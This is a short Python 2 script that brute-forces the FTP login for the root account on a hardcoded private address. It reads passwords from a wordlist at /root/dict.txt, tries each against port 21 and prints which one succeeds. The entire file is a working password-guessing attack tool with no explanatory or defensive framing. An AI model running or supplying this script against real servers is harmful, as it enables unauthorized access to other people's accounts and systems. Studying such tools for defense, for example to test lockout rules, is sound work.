from ftplib import FTP

def dict(ip,password):
	f = open('/root/dict.txt','r')
	fpasswd = f.readlines()
	for passwd in fpasswd:
		vsftp(ip,passwd.strip())

def vsftp(ip,passwd):
	try:
		ftp=FTP()
		ftp.connect(ip,21)	
		ftp.login('root',passwd)
		ftp.quit()
		print ip,'connect ok and','password:'+str(passwd),'ok'
	except:
		print ip,'connect down or',passwd,'error'

if __name__ == '__main__':
	ip='192.168.1.130'
	user='root'
	password='toor'
	dict(ip,password)
